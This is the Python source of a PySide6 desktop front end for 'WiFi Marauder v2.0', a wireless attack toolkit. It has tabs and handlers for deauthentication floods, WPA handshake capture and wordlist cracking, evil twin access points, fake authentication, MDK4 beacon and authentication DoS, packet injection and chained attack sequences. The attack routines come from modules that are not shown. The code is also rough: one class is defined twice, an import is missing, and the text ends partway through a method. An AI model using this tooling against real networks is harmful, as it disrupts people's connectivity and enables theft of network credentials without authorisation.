import sys
import os
import tempfile
# Ensure headless offscreen rendering for Qt (useful for tests/environments without display)
os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
# Ensure Matplotlib cache directory is writable
os.environ.setdefault("MPLCONFIGDIR", tempfile.mkdtemp())
import subprocess
import select
from kit.iface import detect_interfaces, toggle_monitor_mode
from kit.scan import ScanManager
from kit.attacks import build_deauth_cmd, start_deauth, stop_attack, build_packet, send_packet
from kit.analytics import count_vendors, count_handshakes, count_attacks, plot_bar, plot_pie
from kit.db import DatabaseManager as KitDatabaseManager
from kit.crack import CrackManager
import json
import random
import csv
import time
from datetime import datetime
from math import cos, sin, pi, log10
from collections import Counter
from pathlib import Path

from PySide6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QTabWidget, QVBoxLayout, QPushButton,
    QFileDialog, QLabel, QLineEdit, QTextEdit, QHBoxLayout, QMessageBox,
    QTableWidget, QTableWidgetItem, QHeaderView, QComboBox, QGroupBox, QDateEdit, QInputDialog,
    QGridLayout, QSplitter, QSpinBox, QCheckBox, QListWidget, QProgressBar
)
from PySide6.QtCore import QDate, QTimer, Qt
from matplotlib.backends.backend_qt5agg import FigureCanvasQTAgg as FigureCanvas
from matplotlib.figure import Figure
# PySide6 GUI imports
# PySide6 GUI imports
from PySide6.QtGui import QIcon, QPixmap, QAction, QTextCursor
# Scapy sniffing for network mapping
try:
    from scapy.all import AsyncSniffer, Dot11Beacon, Dot11ProbeResp, Dot11Elt, RadioTap, Dot11Deauth, sendp, IP, TCP, UDP, Raw
except ImportError:
    AsyncSniffer = None

# PyQtGraph for topology visualization
try:
    import pyqtgraph as pg
except ImportError:
    pg = None

## Optional dark theme
try:
    import qdarktheme
except ImportError:
    qdarktheme = None

## OUI vendor lookup via manuf library
try:
    from manuf import MacParser
    mac_parser = MacParser()
except ImportError:
    mac_parser = None

  # New imports for integrated features
try:
    from anonymity_tools_logic import AnonymityToolsManager
except ImportError:
    print("Warning: AnonymityToolsManager not available. Functionality will be limited.")
    AnonymityToolsManager = None

try:
    from decoy_networks_logic import DecoyNetworkManager
except ImportError:
    print("Warning: DecoyNetworkManager not available. Functionality will be limited.")
    DecoyNetworkManager = None

try:
    from attack_sequence_logic import AttackSequenceManager
except ImportError:
    print("Warning: AttackSequenceManager not available. Functionality will be limited.")
    AttackSequenceManager = None
try:
    from scapy.all import AsyncSniffer, Dot11Beacon, Dot11ProbeResp, Dot11Elt, Dot11, RadioTap, Dot11Deauth, sendp, IP, TCP, UDP, Raw
except ImportError:
    AsyncSniffer = None

try:
    from network_filter_manager import NetworkFilterManager as NFM
except ImportError:
    print("Warning: NetworkFilterManager not available. Functionality will be limited.")
    NFM = None

try:
    from wps_vulnerability_tester import WPSVulnerabilityTester
except ImportError:
    print("Warning: WPSVulnerabilityTester not available. Functionality will be limited.")
    WPSVulnerabilityTester = None

try:
    from osint_tab import OSINTTab
except ImportError:
    print("Warning: OSINTTab not available. Functionality will be limited.")
    OSINTTab = None

class DatabaseManager:
    """
    Encapsulates SQLite database operations for the WiFi Marauder app.
    """

    def __init__(self, db_file="wifi_marauder.db"):
        self.conn = sqlite3.connect(db_file)
        self.create_tables()

    def create_tables(self):
        """
        Creates the necessary tables if they don't exist.
        """
        cursor = self.conn.cursor()

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY,
                timestamp TEXT,
                interface TEXT,
                duration INTEGER,
                output TEXT
            )
        ''')

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS captures (
                id INTEGER PRIMARY KEY,
                scan_id INTEGER,
                bssid TEXT,
                essid TEXT,
                handshake TEXT,
                FOREIGN KEY (scan_id) REFERENCES scans (id)
            )
        ''')

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS deauths (
                id INTEGER PRIMARY KEY,
                scan_id INTEGER,
                bssid TEXT,
                client TEXT,
                timestamp TEXT,
                FOREIGN KEY (scan_id) REFERENCES scans (id)
            )
        ''')

        # New table for anonymity settings logs
        cursor.execute('''CREATE TABLE IF NOT EXISTS anonymity_logs
                        (id INTEGER PRIMARY KEY,
                        timestamp TEXT,
                        feature TEXT,
                        status TEXT,
                        details TEXT)''')

        # New table for decoy network activities
        cursor.execute('''CREATE TABLE IF NOT EXISTS decoy_activities
                        (id INTEGER PRIMARY KEY,
                        timestamp TEXT,
                        type TEXT,
                        details TEXT)''')

        self.conn.commit()

    def insert_scan(self, interface, duration, output):
        """
        Inserts a new scan record into the database.
        """
        cursor = self.conn.cursor()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        cursor.execute("INSERT INTO scans (timestamp, interface, duration, output) VALUES (?, ?, ?, ?)",
                       (timestamp, interface, duration, output))
        self.conn.commit()
        return cursor.lastrowid

    def insert_capture(self, scan_id, bssid, essid, handshake):
        """
        Inserts a new capture record into the database.
        """
        cursor = self.conn.cursor()
        cursor.execute("INSERT INTO captures (scan_id, bssid, essid, handshake) VALUES (?, ?, ?, ?)",
                       (scan_id, bssid, essid, handshake))
        self.conn.commit()

    def insert_deauth(self, scan_id, bssid, client):
        """
        Inserts a new deauthentication record into the database.
        """
        cursor = self.conn.cursor()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        cursor.execute("INSERT INTO deauths (scan_id, bssid, client, timestamp) VALUES (?, ?, ?, ?)",
                       (scan_id, bssid, client, timestamp))
        self.conn.commit()

    def insert_anonymity_log(self, feature, status, details):
        """
        Inserts a new anonymity log record into the database.
        """
        cursor = self.conn.cursor()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        cursor.execute("INSERT INTO anonymity_logs (timestamp, feature, status, details) VALUES (?, ?, ?, ?)",
                       (timestamp, feature, status, details))
        self.conn.commit()

    def insert_decoy_activity(self, activity_type, details):
        """
        Inserts a new decoy activity record into the database.
        """
        cursor = self.conn.cursor()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        cursor.execute("INSERT INTO decoy_activities (timestamp, type, details) VALUES (?, ?, ?)",
                       (timestamp, activity_type, details))
        self.conn.commit()

    def get_scan_logs(self):
        """
        Retrieves all scan logs from the database.
        """
        cursor = self.conn.cursor()
        cursor.execute("SELECT * FROM scans ORDER BY timestamp DESC")
        return cursor.fetchall()

    def get_captures_for_scan(self, scan_id):
        """
        Retrieves all captures for a given scan ID.
        """
        cursor = self.conn.cursor()
        cursor.execute("SELECT * FROM captures WHERE scan_id = ?", (scan_id,))
        return cursor.fetchall()

    def get_deauths_for_scan(self, scan_id):
        """
        Retrieves all deauthentications for a given scan ID.
        """
        cursor = self.conn.cursor()
        cursor.execute("SELECT * FROM deauths WHERE scan_id = ? ORDER BY timestamp", (scan_id,))
        return cursor.fetchall()
    def get_all_captures(self):
        """Retrieve all handshake captures."""
        cursor = self.conn.cursor()
        cursor.execute("SELECT * FROM captures")
        return cursor.fetchall()
    def get_all_deauths(self):
        """Retrieve all deauthentication records."""
        cursor = self.conn.cursor()
        cursor.execute("SELECT * FROM deauths")
        return cursor.fetchall()
    def get_all_decoy_activities(self):
        """Retrieve all decoy network activities."""
        cursor = self.conn.cursor()
        cursor.execute("SELECT * FROM decoy_activities")
        return cursor.fetchall()

    def close(self):
        """
        Closes the database connection.
        """
        self.conn.close()


class DatabaseManager(KitDatabaseManager):
    """Facade for kit.db DatabaseManager; old implementation is deprecated."""
    pass

class WiFiMarauderApp(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("WiFi Marauder v2.0")
        self.setGeometry(100, 100, 1200, 800)
        
        # Load application icon safely using pathlib
        icon_path = Path(__file__).with_name("wifi_marauder.png")
        if icon_path.exists():
            self.setWindowIcon(QIcon(str(icon_path)))

        # Initialize managers if available
        self.attack_sequence_manager = AttackSequenceManager(self) if AttackSequenceManager else None
        self.network_filter_manager = NFM() if NFM else None
        self.decoy_manager = DecoyNetworkManager() if DecoyNetworkManager else None
        self.anonymity_manager = AnonymityToolsManager() if AnonymityToolsManager else None
        self.wps_tester = WPSVulnerabilityTester() if WPSVulnerabilityTester else None

        self.db_manager = DatabaseManager()
        # Detect interfaces and prepare ScanManager before UI is built
        self.interfaces = detect_interfaces()
        self.scan_manager = ScanManager(self.db_manager)
        # Initialize CrackManager for WPA cracking
        self.crack_manager = CrackManager(self.db_manager)
        self.setup_ui()
        # Load vendor mapping for MAC address lookup
        self.vendor_mapping = self.load_vendors()

        # Theme flag
        self.is_dark_theme = True
        self.apply_theme()

    def setup_ui(self):
        main_widget = QWidget()
        self.setCentralWidget(main_widget)
        layout = QVBoxLayout(main_widget)

        # Create tab widget for different functionalities
        tabs = QTabWidget()
        layout.addWidget(tabs)
        # Add tabs for each feature
        tabs.addTab(self.create_dashboard_tab(), "Dashboard")
        tabs.addTab(self.create_interfaces_tab(), "Interfaces")
        tabs.addTab(self.create_scan_tab(), "Network Scan")
        tabs.addTab(self.create_mapper_tab(), "Network Map")
        tabs.addTab(self.create_attack_tab(), "Attacks")
        tabs.addTab(self.create_anonymity_tab(), "Anonymity Tools")
        tabs.addTab(self.create_decoys_tab(), "Decoy Networks")
        tabs.addTab(self.create_sequence_tab(), "Attack Sequences")
        tabs.addTab(self.create_filters_tab(), "Network Filters")
        tabs.addTab(self.create_wps_tab(), "WPS Testing")
        tabs.addTab(self.create_analytics_tab(), "Analytics")
        tabs.addTab(self.create_logs_tab(), "Logs && Analysis")
        # OSINT lookups tab
        tabs.addTab(OSINTTab(), "OSINT Lookup")
        # Tool execution/help tab
        tabs.addTab(self.create_tools_tab(), "Tools")
        # Tool usage guides tab
        tabs.addTab(self.create_guides_tab(), "Guides")
        
        # ---------------------------
        # Menu bar for View options
        # ---------------------------
        menubar = self.menuBar()
        view_menu = menubar.addMenu("View")
        self.toggle_theme_action = QAction("Toggle Dark/Light Theme", self)
        self.toggle_theme_action.triggered.connect(self.toggle_theme)
        view_menu.addAction(self.toggle_theme_action)

    def create_dashboard_tab(self):
        dashboard_tab = QWidget()
        layout = QVBoxLayout(dashboard_tab)

        # Network Status Summary
        network_group = QGroupBox("Network Status")
        network_layout = QGridLayout(network_group)
        self.network_status_label = QLabel("Networks Detected: 0")
        network_layout.addWidget(self.network_status_label, 0, 0)
        self.scan_status_label = QLabel("Scan Status: Idle")
        network_layout.addWidget(self.scan_status_label, 0, 1)
        layout.addWidget(network_group)

        # Active Attacks Summary
        attacks_group = QGroupBox("Active Attacks")
        attacks_layout = QGridLayout(attacks_group)
        self.attacks_status_label = QLabel("No active attacks")
        attacks_layout.addWidget(self.attacks_status_label, 0, 0)
        self.sequence_status_summary = QLabel("Sequence Status: Idle")
        attacks_layout.addWidget(self.sequence_status_summary, 1, 0)
        layout.addWidget(attacks_group)

        # Applied Filters Summary
        filters_group = QGroupBox("Applied Filters")
        filters_layout = QGridLayout(filters_group)
        self.filters_status_label = QLabel("No filter applied")
        filters_layout.addWidget(self.filters_status_label, 0, 0)
        layout.addWidget(filters_group)

        # Recent Logs Summary
        logs_group = QGroupBox("Recent Logs")
        logs_layout = QVBoxLayout(logs_group)
        self.recent_logs = QTextEdit()
        self.recent_logs.setReadOnly(True)
        self.recent_logs.setText("No recent logs")
        logs_layout.addWidget(self.recent_logs)
        layout.addWidget(logs_group)

        # Update button
        update_button = QPushButton("Refresh Dashboard")
        update_button.clicked.connect(self.update_dashboard)
        layout.addWidget(update_button)

        layout.addStretch()
        return dashboard_tab

    def create_attack_tab(self):
        attack_tab = QWidget()
        layout = QVBoxLayout()

        # Existing attack types
        deauth_group = QGroupBox("Deauthentication Attack")
        deauth_layout = QGridLayout()
        deauth_layout.addWidget(QLabel("Target BSSID:"), 0, 0)
        self.deauth_bssid = QLineEdit()
        deauth_layout.addWidget(self.deauth_bssid, 0, 1)
        deauth_layout.addWidget(QLabel("Client MAC (optional):"), 1, 0)
        self.deauth_client = QLineEdit()
        deauth_layout.addWidget(self.deauth_client, 1, 1)
        # Number of deauth packets
        deauth_layout.addWidget(QLabel("Packet Count:"), 2, 0)
        self.deauth_count = QSpinBox()
        self.deauth_count.setRange(1, 1000)
        self.deauth_count.setValue(10)
        deauth_layout.addWidget(self.deauth_count, 2, 1)
        # Start/Stop buttons
        deauth_start = QPushButton("Start Deauth")
        deauth_start.clicked.connect(self.start_deauth_attack)
        deauth_layout.addWidget(deauth_start, 3, 0)
        deauth_stop = QPushButton("Stop Deauth")
        deauth_stop.clicked.connect(self.stop_deauth_attack)
        deauth_layout.addWidget(deauth_stop, 3, 1)
        # Progress bar
        self.deauth_progress = QProgressBar()
        self.deauth_progress.setValue(0)
        deauth_layout.addWidget(self.deauth_progress, 4, 0, 1, 2)
        deauth_group.setLayout(deauth_layout)
        layout.addWidget(deauth_group)

        handshake_group = QGroupBox("Handshake Capture")
        handshake_layout = QGridLayout()
        handshake_layout.addWidget(QLabel("Target BSSID:"), 0, 0)
        self.handshake_bssid = QLineEdit()
        handshake_layout.addWidget(self.handshake_bssid, 0, 1)
        handshake_start = QPushButton("Start Capture")
        handshake_start.clicked.connect(self.start_handshake_capture)
        handshake_layout.addWidget(handshake_start, 1, 0)
        handshake_stop = QPushButton("Stop Capture")
        handshake_stop.clicked.connect(self.stop_handshake_capture)
        handshake_layout.addWidget(handshake_stop, 1, 1)
        self.handshake_progress = QProgressBar()
        self.handshake_progress.setValue(0)
        handshake_layout.addWidget(self.handshake_progress, 2, 0, 1, 2)
        handshake_group.setLayout(handshake_layout)
        layout.addWidget(handshake_group)
        # WPA Cracking controls
        crack_group = QGroupBox("WPA Cracking")
        crack_layout = QGridLayout(crack_group)
        crack_layout.addWidget(QLabel("Handshake File:"), 0, 0)
        self.crack_handshake = QLineEdit()
        crack_layout.addWidget(self.crack_handshake, 0, 1)
        hs_browse = QPushButton("Browse")
        hs_browse.clicked.connect(self.browse_handshake_file)
        crack_layout.addWidget(hs_browse, 0, 2)
        crack_layout.addWidget(QLabel("Wordlist File:"), 1, 0)
        self.crack_wordlist = QLineEdit()
        crack_layout.addWidget(self.crack_wordlist, 1, 1)
        wl_browse = QPushButton("Browse")
        wl_browse.clicked.connect(self.browse_wordlist_file)
        crack_layout.addWidget(wl_browse, 1, 2)
        self.crack_btn = QPushButton("Start Cracking")
        self.crack_btn.clicked.connect(self.start_cracking)
        crack_layout.addWidget(self.crack_btn, 2, 0)
        self.stop_crack_btn = QPushButton("Stop Cracking")
        self.stop_crack_btn.clicked.connect(self.stop_cracking)
        crack_layout.addWidget(self.stop_crack_btn, 2, 1)
        self.crack_progress = QProgressBar()
        self.crack_progress.setValue(0)
        crack_layout.addWidget(self.crack_progress, 3, 0, 1, 3)
        self.crack_status = QLabel("Status: Idle")
        crack_layout.addWidget(self.crack_status, 4, 0, 1, 3)
        layout.addWidget(crack_group)

        # New Attack Sequence section
        sequence_group = QGroupBox("Attack Sequences")
        sequence_layout = QGridLayout()
        sequence_layout.addWidget(QLabel("Sequence Name:"), 0, 0)
        self.sequence_name = QLineEdit()
        sequence_layout.addWidget(self.sequence_name, 0, 1)
        sequence_layout.addWidget(QLabel("Steps (JSON format):"), 1, 0)
        self.sequence_steps = QTextEdit()
        self.sequence_steps.setPlaceholderText("[{'type': 'deauth', 'duration': 10, 'target': 'BSSID'}, {'type': 'handshake_capture', 'timeout': 30}]")
        sequence_layout.addWidget(self.sequence_steps, 1, 1, 3, 1)
        define_sequence_btn = QPushButton("Define Sequence")
        define_sequence_btn.clicked.connect(self.define_attack_sequence)
        sequence_layout.addWidget(define_sequence_btn, 4, 0)
        start_sequence_btn = QPushButton("Start Sequence")
        start_sequence_btn.clicked.connect(self.start_attack_sequence)
        sequence_layout.addWidget(start_sequence_btn, 4, 1)
        stop_sequence_btn = QPushButton("Stop Sequence")
        stop_sequence_btn.clicked.connect(self.stop_attack_sequence)
        sequence_layout.addWidget(stop_sequence_btn, 5, 0)
        self.sequence_status = QLabel("Sequence Status: Idle")
        sequence_layout.addWidget(self.sequence_status, 5, 1)
        sequence_group.setLayout(sequence_layout)
        layout.addWidget(sequence_group)

        evilap_group = QGroupBox("Evil Twin AP")
        evilap_layout = QGridLayout()
        evilap_layout.addWidget(QLabel("ESSID to Mimic:"), 0, 0)
        self.evilap_essid = QLineEdit()
        evilap_layout.addWidget(self.evilap_essid, 0, 1)
        evilap_layout.addWidget(QLabel("Password (if any):"), 1, 0)
        self.evilap_password = QLineEdit()
        evilap_layout.addWidget(self.evilap_password, 1, 1)
        evilap_start = QPushButton("Start Evil AP")
        evilap_start.clicked.connect(self.start_evil_ap)
        evilap_layout.addWidget(evilap_start, 2, 0)
        evilap_stop = QPushButton("Stop Evil AP")
        evilap_stop.clicked.connect(self.stop_evil_ap)
        evilap_layout.addWidget(evilap_stop, 2, 1)
        self.evilap_progress = QProgressBar()
        self.evilap_progress.setValue(0)
        evilap_layout.addWidget(self.evilap_progress, 3, 0, 1, 2)
        evilap_group.setLayout(evilap_layout)
        layout.addWidget(evilap_group)

        fakeauth_group = QGroupBox("FakeAuth Attack")
        fakeauth_layout = QGridLayout()
        fakeauth_layout.addWidget(QLabel("Target BSSID:"), 0, 0)
        self.fakeauth_bssid = QLineEdit()
        fakeauth_layout.addWidget(self.fakeauth_bssid, 0, 1)
        fakeauth_start = QPushButton("Start FakeAuth")
        fakeauth_start.clicked.connect(self.start_fakeauth_attack)
        fakeauth_layout.addWidget(fakeauth_start, 1, 0)
        fakeauth_stop = QPushButton("Stop FakeAuth")
        fakeauth_stop.clicked.connect(self.stop_fakeauth_attack)
        fakeauth_layout.addWidget(fakeauth_stop, 1, 1)
        self.fakeauth_progress = QProgressBar()
        self.fakeauth_progress.setValue(0)
        fakeauth_layout.addWidget(self.fakeauth_progress, 2, 0, 1, 2)
        fakeauth_group.setLayout(fakeauth_layout)
        layout.addWidget(fakeauth_group)

        # Enhanced MDK4 Wireless Disruption Tools section
        mdk4_group = QGroupBox("Wireless Disruption Tools (MDK4)")
        mdk4_layout = QGridLayout()
        mdk4_layout.addWidget(QLabel("Target BSSID:"), 0, 0)
        self.mdk4_bssid = QLineEdit()
        mdk4_layout.addWidget(self.mdk4_bssid, 0, 1)
        mdk4_layout.addWidget(QLabel("Attack Mode:"), 1, 0)
        self.mdk4_mode = QComboBox()
        self.mdk4_mode.addItems(["Bandwidth Throttling", "Beacon Flooding", "Authentication DoS", "Deauthentication Flood"])
        mdk4_layout.addWidget(self.mdk4_mode, 1, 1)
        mdk4_layout.addWidget(QLabel("Intensity (1-10):"), 2, 0)
        self.mdk4_intensity = QSpinBox()
        self.mdk4_intensity.setRange(1, 10)
        self.mdk4_intensity.setValue(5)
        mdk4_layout.addWidget(self.mdk4_intensity, 2, 1)
        mdk4_start = QPushButton("Start Attack")
        mdk4_start.clicked.connect(self.start_mdk4_attack)
        mdk4_layout.addWidget(mdk4_start, 3, 0)
        mdk4_stop = QPushButton("Stop Attack")
        mdk4_stop.clicked.connect(self.stop_mdk4_attack)
        mdk4_layout.addWidget(mdk4_stop, 3, 1)
        self.mdk4_progress = QProgressBar()
        self.mdk4_progress.setValue(0)
        mdk4_layout.addWidget(self.mdk4_progress, 4, 0, 1, 2)
        self.mdk4_status = QLabel("MDK4 Attack Status: Idle")
        mdk4_layout.addWidget(self.mdk4_status, 5, 0, 1, 2)
        mdk4_group.setLayout(mdk4_layout)
        layout.addWidget(mdk4_group)
        # ---------------------------
        # Packet Crafting & Injection
        # ---------------------------
        packet_group = QGroupBox("Packet Crafting & Injection")
        packet_layout = QGridLayout()
        packet_layout.addWidget(QLabel("Packet Type:"), 0, 0)
        self.packet_type = QComboBox()
        self.packet_type.addItems(["Deauth Flood", "Beacon Flood", "Custom TCP", "Custom UDP"])
        packet_layout.addWidget(self.packet_type, 0, 1)
        packet_layout.addWidget(QLabel("Target (BSSID/IP):"), 1, 0)
        self.packet_target = QLineEdit()
        packet_layout.addWidget(self.packet_target, 1, 1)
        packet_layout.addWidget(QLabel("Channel/Port (optional):"), 2, 0)
        self.packet_param = QLineEdit()
        packet_layout.addWidget(self.packet_param, 2, 1)
        preview_btn = QPushButton("Preview Packet")
        preview_btn.clicked.connect(self.preview_packet)
        packet_layout.addWidget(preview_btn, 3, 0)
        send_btn = QPushButton("Send Packet")
        send_btn.clicked.connect(self.start_packet_crafting)
        packet_layout.addWidget(send_btn, 3, 1)
        self.packet_status = QLabel("Status: Idle")
        packet_layout.addWidget(self.packet_status, 4, 0, 1, 2)
        packet_group.setLayout(packet_layout)
        layout.addWidget(packet_group)

        layout.addStretch()
        attack_tab.setLayout(layout)
        return attack_tab

    def define_attack_sequence(self):
        try:
            name = self.sequence_name.text().strip()
            steps_text = self.sequence_steps.toPlainText().strip()
            if not name or not steps_text:
                QMessageBox.warning(self, "Input Error", "Please provide both a sequence name and steps.")
                return
            steps = json.loads(steps_text)
            if not isinstance(steps, list):
                QMessageBox.warning(self, "Format Error", "Steps must be a list of attack configurations.")
                return
            if hasattr(self, 'attack_sequence_manager') and self.attack_sequence_manager:
                self.attack_sequence_manager.define_sequence(name, steps)
                self.log(f"Defined attack sequence: {name}")
                QMessageBox.information(self, "Success", f"Sequence '{name}' defined successfully.")
            else:
                QMessageBox.warning(self, "Feature Unavailable", "Attack Sequence Manager is not available.")
        except json.JSONDecodeError as e:
            QMessageBox.warning(self, "JSON Error", f"Invalid JSON format in steps: {str(e)}")
        except Exception as e:
            self.log(f"Error defining attack sequence: {str(e)}")
            QMessageBox.warning(self, "Error", f"Failed to define sequence: {str(e)}")

    def start_attack_sequence(self):
        try:
            name = self.sequence_name.text().strip()
            if not name:
                QMessageBox.warning(self, "Input Error", "Please provide a sequence name.")
                return
            if hasattr(self, 'attack_sequence_manager') and self.attack_sequence_manager:
                if self.attack_sequence_manager.start_sequence(name):
                    self.log(f"Started attack sequence: {name}")
                    self.sequence_status.setText(f"Sequence Status: Running {name}")
                    # Start a timer to execute steps
                    self.sequence_timer = QTimer(self)
                    self.sequence_timer.timeout.connect(self.execute_sequence_step)
                    self.sequence_timer.start(5000)  # Check every 5 seconds
                else:
                    QMessageBox.warning(self, "Start Failed", f"Sequence '{name}' not found or already active.")
            else:
                QMessageBox.warning(self, "Feature Unavailable", "Attack Sequence Manager is not available.")
        except Exception as e:
            self.log(f"Error starting attack sequence: {str(e)}")
            QMessageBox.warning(self, "Error", f"Failed to start sequence: {str(e)}")

    def execute_sequence_step(self):
        try:
            if hasattr(self, 'attack_sequence_manager') and self.attack_sequence_manager:
                status = self.attack_sequence_manager.get_sequence_status()
                if status['status'] == 'running':
                    result = self.attack_sequence_manager.execute_current_step()
                    self.log(f"Sequence step result: {result}")
                    if result['status'] == 'complete':
                        self.sequence_status.setText("Sequence Status: Completed")
                        if hasattr(self, 'sequence_timer'):
                            self.sequence_timer.stop()
                    elif result['status'] == 'error':
                        self.sequence_status.setText(f"Sequence Status: Error - {result['message']}")
                        if hasattr(self, 'sequence_timer'):
                            self.sequence_timer.stop()
                else:
                    self.sequence_status.setText("Sequence Status: Idle")
                    if hasattr(self, 'sequence_timer'):
                        self.sequence_timer.stop()
        except Exception as e:
            self.log(f"Error executing sequence step: {str(e)}")
            self.sequence_status.setText(f"Sequence Status: Error - {str(e)}")
            if hasattr(self, 'sequence_timer'):
                self.sequence_timer.stop()

    def stop_attack_sequence(self):
        try:
            if hasattr(self, 'attack_sequence_manager') and self.attack_sequence_manager:
                if self.attack_sequence_manager.stop_sequence():
                    self.log("Stopped attack sequence.")
                    self.sequence_status.setText("Sequence Status: Stopped")
                    if hasattr(self, 'sequence_timer'):
                        self.sequence_timer.stop()
                else:
                    QMessageBox.warning(self, "Stop Failed", "No active sequence to stop.")
            else:
                QMessageBox.warning(self, "Feature Unavailable", "Attack Sequence Manager is not available.")
        except Exception as e:
            self.log(f"Error stopping attack sequence: {str(e)}")
            QMessageBox.warning(self, "Error", f"Failed to stop sequence: {str(e)}")

    def create_scan_tab(self):
        scan_tab = QWidget()
        main_layout = QVBoxLayout(scan_tab)

        scan_group = QGroupBox("WiFi Scan")
        scan_layout = QGridLayout()
        scan_layout.addWidget(QLabel("Interface:"), 0, 0)
        self.scan_interface = QComboBox()
        self.scan_interface.addItems(self.interfaces)
        scan_layout.addWidget(self.scan_interface, 0, 1)
        scan_layout.addWidget(QLabel("Duration (seconds):"), 1, 0)
        self.scan_duration = QSpinBox()
        self.scan_duration.setRange(10, 300)
        self.scan_duration.setValue(30)
        scan_layout.addWidget(self.scan_duration, 1, 1)
        scan_button = QPushButton("Start Scan")
        scan_button.clicked.connect(self.start_scan)
        scan_layout.addWidget(scan_button, 2, 0)
        self.scan_progress = QProgressBar()
        self.scan_progress.setValue(0)
        scan_layout.addWidget(self.scan_progress, 2, 1)
        scan_group.setLayout(scan_layout)
        main_layout.addWidget(scan_group)

        # New Network Filter section
        filter_group = QGroupBox("Network Filters")
        filter_layout = QGridLayout()
        filter_layout.addWidget(QLabel("Filter Profile Name:"), 0, 0)
        self.filter_name = QLineEdit()
        filter_layout.addWidget(self.filter_name, 0, 1)
        filter_layout.addWidget(QLabel("Criteria (JSON format):"), 1, 0)
        self.filter_criteria = QTextEdit()
        self.filter_criteria.setPlaceholderText("{'signal_strength_min': -70, 'encryption_types': ['WPA2'], 'channels': [1, 6, 11]}")
        filter_layout.addWidget(self.filter_criteria, 1, 1, 3, 1)
        define_filter_btn = QPushButton("Define Filter Profile")
        define_filter_btn.clicked.connect(self.define_filter_profile)
        filter_layout.addWidget(define_filter_btn, 4, 0)
        apply_filter_btn = QPushButton("Apply Filter Profile")
        apply_filter_btn.clicked.connect(self.apply_filter_profile)
        filter_layout.addWidget(apply_filter_btn, 4, 1)
        self.filter_status = QLabel("Filter Status: No filter active")
        filter_layout.addWidget(self.filter_status, 5, 0, 1, 2)
        filter_group.setLayout(filter_layout)
        main_layout.addWidget(filter_group)

        result_group = QGroupBox("Scan Results")
        result_layout = QVBoxLayout()
        self.result_table = QTableWidget()
        self.result_table.setRowCount(0)
        self.result_table.setColumnCount(6)
        self.result_table.setHorizontalHeaderLabels(["BSSID", "ESSID", "Signal", "Channel", "Encryption", "Select"])
        self.result_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        result_layout.addWidget(self.result_table)
        select_all_btn = QPushButton("Select All")
        select_all_btn.clicked.connect(self.select_all_networks)
        result_layout.addWidget(select_all_btn)
        set_target_btn = QPushButton("Set as Target")
        set_target_btn.clicked.connect(self.set_as_target)
        result_layout.addWidget(set_target_btn)
        result_group.setLayout(result_layout)
        # Prepare scan log table and raw output pane
        self.scanlog_table = QTableWidget()
        self.scanlog_table.setColumnCount(5)
        self.scanlog_table.setHorizontalHeaderLabels(["ID", "Timestamp", "Interface", "Duration", "Output"])
        self.scanlog_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self.scan_output = QTextEdit()
        self.scan_output.setReadOnly(True)
        # Sub-tabs for Results, Logs, and Raw Output
        scan_subtabs = QTabWidget()
        # Results tab
        results_tab = QWidget()
        results_layout = QVBoxLayout(results_tab)
        results_layout.addWidget(result_group)
        scan_subtabs.addTab(results_tab, "Results")
        # Logs tab
        logs_tab = QWidget()
        logs_layout = QVBoxLayout(logs_tab)
        logs_layout.addWidget(self.scanlog_table)
        scan_subtabs.addTab(logs_tab, "Logs")
        # Raw output tab
        raw_tab = QWidget()
        raw_layout = QVBoxLayout(raw_tab)
        raw_layout.addWidget(self.scan_output)
        scan_subtabs.addTab(raw_tab, "Raw Output")
        main_layout.addWidget(scan_subtabs)

        main_layout.addStretch()
        return scan_tab

    def create_mapper_tab(self):
        """Live packet sniffer and network mapper tab."""
        mapper_tab = QWidget()
        layout = QVBoxLayout(mapper_tab)

        # Interface selection and controls
        control_layout = QHBoxLayout()
        control_layout.addWidget(QLabel("Interface:"))
        self.mapper_interface = QComboBox()
        # Populate with same interfaces as scan tab
        for i in range(self.scan_interface.count()):
            self.mapper_interface.addItem(self.scan_interface.itemText(i))
        control_layout.addWidget(self.mapper_interface)
        start_btn = QPushButton("Start Sniffing")
        start_btn.clicked.connect(self.start_sniffing)
        control_layout.addWidget(start_btn)
        stop_btn = QPushButton("Stop Sniffing")
        stop_btn.clicked.connect(self.stop_sniffing)
        control_layout.addWidget(stop_btn)
        layout.addLayout(control_layout)

        # Mapping results table
        self.mapping_table = QTableWidget()
        self.mapping_table.setColumnCount(4)
        self.mapping_table.setHorizontalHeaderLabels(["BSSID", "ESSID", "Count", "Vendor"])
        self.mapping_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        layout.addWidget(self.mapping_table)

        # Scatter plot for channel vs count
        if pg:
            self.map_plot = pg.PlotWidget(title="AP Count vs Channel")
            self.map_plot.setLabel('bottom', 'Channel')
            self.map_plot.setLabel('left', 'Packet Count')
            layout.addWidget(self.map_plot)
        # Internal state
        self.ap_records = {}
        self.sniffer = None
        # Geolocation overlay
        geo_btn = QPushButton("Generate Geo Map")
        geo_btn.clicked.connect(self.generate_geo_map)
        layout.addWidget(geo_btn)
        mapper_tab.setLayout(layout)
        return mapper_tab

    def define_filter_profile(self):
        try:
            name = self.filter_name.text().strip()
            criteria_text = self.filter_criteria.toPlainText().strip()
            if not name or not criteria_text:
                QMessageBox.warning(self, "Input Error", "Please provide both a filter profile name and criteria.")
                return
            criteria = json.loads(criteria_text)
            if not isinstance(criteria, dict):
                QMessageBox.warning(self, "Format Error", "Criteria must be a dictionary of filter settings.")
                return
            if hasattr(self, 'network_filter_manager') and self.network_filter_manager:
                self.network_filter_manager.define_filter_profile(name, criteria, f"User-defined filter on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
                self.log(f"Defined network filter profile: {name}")
                QMessageBox.information(self, "Success", f"Filter profile '{name}' defined successfully.")
            else:
                QMessageBox.warning(self, "Feature Unavailable", "Network Filter Manager is not available.")
